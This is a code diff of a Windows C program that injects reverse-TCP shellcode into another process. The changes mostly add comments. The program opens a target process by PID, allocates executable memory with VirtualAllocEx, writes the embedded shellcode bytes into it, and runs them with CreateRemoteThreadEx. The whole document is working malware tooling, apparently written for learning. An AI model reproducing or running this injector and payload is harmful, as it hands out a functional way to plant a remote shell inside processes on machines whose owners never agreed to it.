@@ -12,6 +12,7 @@ int main(int argc, char* argv[]) {
     DWORD dwPID = NULL, dwTID = NULL;
     HANDLE hProcess = NULL, hThread = NULL;
 
+    /* reverse TCP shellcode a.k.a. payload*/
     unsigned char shellCode[] ="\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
                                "\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x56\x48\x8b\x52"
                                "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
@@ -52,17 +53,21 @@ int main(int argc, char* argv[]) {
 
     size_t shellCodeSize = sizeof(shellCode);
 
+    /* if the PID is not expecified the program exits*/
     if (argc < 2) {
         printf("%s usage: %s <PID>", e, argv[0]);
         return EXIT_FAILURE;
     }
 
+    /* process ID writen in dwPID variable*/
     dwPID = atoi(argv[1]);
 
     printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);
 
+    /* Open a handler to the process in question */
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 
 
+    /* check if all went well */
     if (hProcess == NULL) {
         printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
         return EXIT_FAILURE;
@@ -70,20 +75,24 @@ int main(int argc, char* argv[]) {
 
     printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);
 
+    /* allocate a buffer with the shellcode size in the process */
     rBuffer = VirtualAllocEx(hProcess, NULL, shellCodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, shellCodeSize);
 
+    /* check if all went well */
     if (rBuffer == NULL) {
         printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
         return EXIT_FAILURE;
     }
 
+    /* write the payload in the buffer allocated in the process */
     WriteProcessMemory(hProcess, rBuffer, shellCode, shellCodeSize, NULL);
     printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(shellCode));
 
-    /* create thread to run the payload */
+    /* create thread (thread handle) to run the payload */
     hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
     
+    /* check if all went well */
     if (hThread == NULL) {
         printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
         return EXIT_FAILURE;
@@ -95,6 +104,7 @@ int main(int argc, char* argv[]) {
     WaitForSingleObject(hThread, INFINITE);
     printf("%s thread finished executing, cleaning up\n", k);
 
+    /* close the handles */
     CloseHandle(hThread);
     CloseHandle(hProcess);
     printf("%s finished, see you next time :>", k);
